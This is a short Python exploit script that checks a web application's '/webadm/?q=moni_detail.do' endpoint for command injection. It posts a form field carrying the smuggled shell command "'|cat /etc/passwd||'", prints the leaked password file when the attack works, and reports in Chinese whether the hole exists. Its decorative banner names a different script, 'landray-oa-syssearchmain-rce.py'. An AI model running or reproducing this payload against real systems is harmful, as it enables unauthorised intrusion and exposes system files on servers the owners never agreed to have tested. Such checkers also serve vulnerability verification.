#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/webadm/?q=moni_detail.do&action=gragh"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"type": "'|cat /etc/passwd||'"}
    req =  requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    data = req.text
    if "root:x:0:0" in data:
        return data.split("</html>")[-1]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-syssearchmain-rce.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 cat /etc/passwd 结果为：", info[:1000])
    else:
        print("[-]漏洞不存在")
